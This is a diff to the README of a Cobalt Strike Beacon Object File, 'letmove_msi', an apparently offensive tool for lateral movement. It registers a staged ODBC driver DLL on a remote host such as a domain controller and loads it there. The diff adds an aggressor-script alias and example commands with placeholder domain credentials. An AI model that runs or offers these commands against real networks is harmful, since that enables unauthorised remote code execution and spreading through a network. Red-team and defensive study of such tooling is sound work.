@@ -45,13 +45,16 @@ letmove_msi <local|remote> <host> <domain> <user> <pass> <driver> <dll>
 - `driver`: ODBC driver name to register (arbitrary).
 - `dll`: absolute path to the driver DLL on the **target**, not the operator's machine. Stage `odbcpivot.dll` (or any DLL exporting `ConfigDriver`) there first.
 
-Example Cobalt Strike aggressor call:
+### Aggressor script
+
+Load `letmove_msi.cna` in Cobalt Strike (`Script Manager > Load...`) to get a `letmove_msi` alias with argument validation, architecture auto-selection, and inline help via `help letmove_msi`.
 
 ```
-bof_execute($1, "letmove_msi.x64.o", "ZZZZZZZ",
-    "remote", "DC01", "CORP", "svc-admin", "P4ss!",
-    "LMPivot", "C:\\Windows\\Temp\\odbcpivot.dll");
+letmove_msi remote DC01 CORP svc-admin P4ss! LMPivot C:\Windows\Temp\odbcpivot.dll
+letmove_msi local "" "" "" "" LMPivot C:\Windows\Temp\odbcpivot.dll
 ```
+
+The script looks up the BoF object in `dist/` first, then falls back to `bof/out/` for source builds.
 
 ## Driver behaviour
 
